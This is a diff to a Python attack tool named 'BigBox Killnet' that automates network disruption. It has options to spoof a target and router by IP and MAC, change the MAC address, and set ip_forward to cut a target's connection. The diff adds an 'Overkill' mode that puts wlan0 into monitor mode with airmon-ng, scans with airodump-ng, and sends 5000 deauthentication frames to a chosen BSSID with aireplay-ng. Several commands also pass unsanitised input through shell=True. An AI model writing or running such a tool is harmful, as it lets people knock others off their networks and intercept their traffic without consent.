@@ -5,21 +5,21 @@ import subprocess
 import re
 import pyfiglet
 import sys
-ascii_banner = pyfiglet.figlet_format("BigBox\nKillnet")
+ascii_banner = pyfiglet.figlet_format("BigBox Killnet")
 print(ascii_banner)
 
 def get_user_input():
     parse_object = optparse.OptionParser()
-    parse_object.add_option("-I","--IP_range", dest="IP_range",help="Enter the IP range to find target: ")
+    parse_object.add_option("-I","--IP_range", dest="IP_range",help="Enter the IP range to find target (Ex: 192.168.1.0/24): ")
     parse_object.add_option("-t","--target_IP", dest="Target_IP",help="Enter the IP of the target: ")
     parse_object.add_option("-m","--target_MAC", dest="Target_MAC",help="Enter the MAC of the target: ")
     parse_object.add_option("-r","--router_IP", dest="Router_IP",help="Enter the IP of the router: ")
     parse_object.add_option("-M","--router_MAC", dest="Router_MAC",help="Enter the MAC of the router: ")
-    parse_object.add_option("-s","--ON_OFF", dest="ON_OFF",help="ON/OFF target's network: ")
+    parse_object.add_option("-s","--ON_OFF", dest="ON_OFF",help="ON/OFF (1 or 0) target's network: ")
     parse_object.add_option("-i","--interface",dest="interface",help="Enter the interface: ")
     parse_object.add_option("-a","--mac",dest="mac_address",help="Enter new mac address: ")
-    parse_object.add_option("-R","--ready",dest="ready_for_overkill",help="Enter the interface of USB wifi card (wlan0): ")
-    
+    parse_object.add_option("-R","--ready",dest="ready_for_overkill",help="Enter the time to search for target (second): ")
+    parse_object.add_option("-O","--overkill",dest="Overkill",help="Enter the target's BSSID: ")
     return parse_object.parse_args()
 
 (User_input,arg)=get_user_input()
@@ -33,29 +33,30 @@ KILLMODE = User_input.ON_OFF
 INTERFACE = User_input.interface
 MAC = User_input.mac_address
 READY_FOR_OVERKILL = User_input.ready_for_overkill
+OVERKILL = User_input.Overkill
 
-def Ready_for_Overkill(interface):
-    print(f"\n>>> Remember! Check the {interface} interface\n")
+def Ready_for_Overkill(time_to_kill):
+    print(f"\n>>> Remember! Check the wlan0 interface\n")
     time.sleep(3)
-    print(f">>> Checking for {interface} interface\n")
+    print(f">>> Checking for wlan0 interface\n")
     
     ifconfig = subprocess.check_output(["ifconfig"])
     check_wlan0 = re.search(r'wlan0:',str(ifconfig))
     re_check_wlan0mon = re.search(r'wlan0mon:',str(ifconfig))
     if check_wlan0:
         good =  check_wlan0.group(0)
-        print(f">>> Noice! {interface} is on\n")
+        print(f">>> Noice! wlan0 is on\n")
         time.sleep(0.5)
-        print(f">>> Transform {interface} to wlan0mon\n")
+        print(f">>> Transform wlan0 to wlan0mon\n")
         time.sleep(3)
-        subprocess.call(f"airmon-ng start {interface}", shell=True)
+        subprocess.call(f"airmon-ng start wlan0", shell=True)
         time.sleep(3)
         transform = subprocess.check_output(["ifconfig"])
         check_wlan0mon = re.search(r'wlan0mon:',str(transform))
         if check_wlan0mon:
                 try:
-                    print(">>> Tranform completed ! Ready for Overkill mode")
-                    subprocess.call(["airodump-ng","wlan0mon"],timeout = 20)
+                    print("\n>>> Tranform completed ! Ready for Overkill mode")
+                    subprocess.call(["airodump-ng","wlan0mon"],timeout = time_to_kill)
                 except subprocess.TimeoutExpired: 
                     print("\n>>> Stop hunting")
                     sys.exit(1)
@@ -67,7 +68,7 @@ def Ready_for_Overkill(interface):
                print(">>> Everything you need is already on! Ready for Overkill mode")
                try:
                     print(">>> Tranform completed ! Ready for Overkill mode")
-                    subprocess.call(["airodump-ng","wlan0mon"],timeout = 20)
+                    subprocess.call(["airodump-ng","wlan0mon"],timeout = time_to_kill)
                except subprocess.TimeoutExpired: 
                     print("\n>>> Stop hunting")
                     sys.exit(1)
@@ -75,9 +76,28 @@ def Ready_for_Overkill(interface):
     else:
         return print(f">>> Oh! Check your USB wificard or interface again please")
 if READY_FOR_OVERKILL:
-   Ready_for_Overkill(READY_FOR_OVERKILL) 
+   ready = int(READY_FOR_OVERKILL)
+   Ready_for_Overkill(ready) 
 else: 
     None
+
+def Overkill_mode(BSSID):
+    transform = subprocess.check_output(["ifconfig"])
+    check_wlan0mon = re.search(r'wlan0mon:',str(transform))
+    if check_wlan0mon:
+        try:
+            print("\n>>> Starting Overkill mode\n")
+            time.sleep(2)
+            subprocess.call(f"aireplay-ng --deauth 5000 -a {BSSID} wlan0mon", shell=True)
+        except ValueError:
+            print("\n>>> That was no valid number. Please try again")
+    else: 
+        print("\n>>> Please start Ready for Overkill mode (-R) first") 
+if OVERKILL:
+   Overkill_mode(OVERKILL)
+else: 
+    None
+
 def Change_mac_address(user_interface,user_mac_address):
     print("\n>>> Changing your MAC address")
     time.sleep(2)
@@ -92,6 +112,8 @@ def Change_mac_address(user_interface,user_mac_address):
     print(f"\n>>> Your new MAC address : {NEW_MAC}")
 if MAC and INTERFACE:
         Change_mac_address(INTERFACE, MAC)
+else: 
+    None
 def Killmode():
      return subprocess.call(f"echo {KILLMODE} > /proc/sys/net/ipv4/ip_forward", shell=True)
     
